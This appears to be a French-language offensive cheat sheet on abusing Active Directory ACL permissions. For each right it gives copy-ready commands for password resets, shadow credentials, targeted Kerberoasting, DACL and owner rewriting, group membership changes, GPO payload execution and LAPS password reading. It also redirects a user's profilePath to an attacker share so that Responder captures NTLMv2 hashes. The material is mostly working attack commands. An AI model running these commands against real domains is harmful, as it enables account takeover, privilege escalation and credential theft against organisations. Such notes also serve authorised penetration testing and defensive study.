Chaque objet AD a une ACL (Access Control List) composée d'ACEs (Access Control Entries). Permissions intéressantes pour un attaquant :

|Permission|Effet|
|---|---|
|`GenericAll`|Contrôle total sur l'objet|
|`GenericWrite`|Modifier certains attributs|
|`WriteOwner`|Changer le propriétaire|
|`WriteDACL`|Modifier les ACEs|
|`AllExtendedRights`|Reset de mot de passe, etc.|
|`ForceChangePassword`|Forcer le changement de mdp|
|`Self`|S'ajouter soi-même (ex: à un groupe)|

# Exploitation des droits/ACLs

## ForceChangePassword

Réinitialiser le mot de passe d’un utilisateur sans connaître l’ancien → prise de contrôle immédiate du compte.

```bash
rpcclient -U ‘DOMAIN/attacker%Password123’ <DC_IP> -c "setuserinfo2 <target_user> 23 ‘NewPass123!’"
```

## GenericWrite

Écriture sur plusieurs attributs de l’objet (user ou computer) → permet :

**Shadow Credentials** — injection de clé publique PKINIT
```bash
python3 pywhisker.py -d domain.local -u attacker -p ‘Password123’ --dc-ip <DC_IP> --target <target_user> --action add
```

**Targeted Kerberoasting** — ajout d’un SPN factice puis kerberoast
```bash
python3 targetedKerberoast.py -d domain.local -u attacker -p ‘Password123’ --dc-ip <DC_IP>
```

**profilePath / scriptPath** — pointer vers un partage contrôlé pour capturer un hash NTLMv2
```bash
bloodyAD -u attacker -p ‘Password123’ -d domain.local --host <DC_IP> set object <target_user> profilePath -v ‘\\<attacker_ip>\share’
sudo responder -I eth0
```

## WriteDACL

Modifier les permissions (ACL) de l’objet → s’octroyer `GenericAll`, puis effectuer toutes les actions possibles sur la cible.

```bash
dacledit.py -action write -rights FullControl -principal <attacker_user> -target <target_object> ‘domain.local/attacker:Password123’ -dc-ip <DC_IP>
```

## AddMember

Ajouter un utilisateur à un groupe → si groupe à privilèges, escalade immédiate.

```bash
bloodyAD -u attacker -p ‘Password123’ -d domain.local --host <DC_IP> add groupMember ‘<target_group>’ ‘<attacker_user>’
```

## WriteOwner

Changer le propriétaire d’un objet → une fois propriétaire, modifier les ACL pour s’octroyer `GenericAll`.

```bash
# étape 1 : prendre l’ownership
owneredit.py -action write -new-owner <attacker_user> -target <target_object> ‘domain.local/attacker:Password123’ -dc-ip <DC_IP>
# étape 2 : s’octroyer FullControl
dacledit.py -action write -rights FullControl -principal <attacker_user> -target <target_object> ‘domain.local/attacker:Password123’ -dc-ip <DC_IP>
```

## GenericAll

Contrôle total sur l’objet → utiliser la technique adaptée au type de cible.

```bash
# Sur un user : reset mdp
rpcclient -U ‘DOMAIN/attacker%Password123’ <DC_IP> -c "setuserinfo2 <target_user> 23 ‘NewPass123!’"
# Sur un groupe : add member
bloodyAD -u attacker -p ‘Password123’ -d domain.local --host <DC_IP> add groupMember ‘<target_group>’ ‘<attacker_user>’
# Sur une machine : → RBCD (voir section dédiée)
```

## GPO Abuse

Modifier une stratégie de groupe pour exécuter un payload sur une machine ou sur tous les utilisateurs visés.
https://github.com/Hackndo/pyGPOAbuse

```bash
python3 pygpoabuse.py ‘domain.local/attacker:Password123’ -gpo-id <GPO_GUID> -command ‘<payload>’ -dc-ip <DC_IP>
```

## Read LAPS Password

Lire les mots de passe locaux administrateur gérés par LAPS → accès local admin sur les machines cibles.

```bash
nxc ldap <DC_IP> -u attacker -p ‘Password123’ -M laps
```


# Exploitation de droits spécifiques

* **Shadow Credentials** : si `GenericWrite` sur un compte → injection de clé PKINIT (via `Whisker`, `ForgeCert`, etc.). [ADCS - Shadow Credentials](ADCS.md#shadow-credentials)
* **sAMAccountName Spoofing** : si droit de **joindre une machine** (10 par défaut), et DC vulnérable. [Accès authentifié - sAMAccountName](04_acces-authentifie.md#samaccountname)
* **Resource-Based Constrained Delegation (RBCD)** : si contrôle sur un objet machine.
* **DCSync** : si accès à `Replicating Directory Changes (All)` sur le domaine.
* SeEnableDelegationPrivilege : délégation de contrainte.
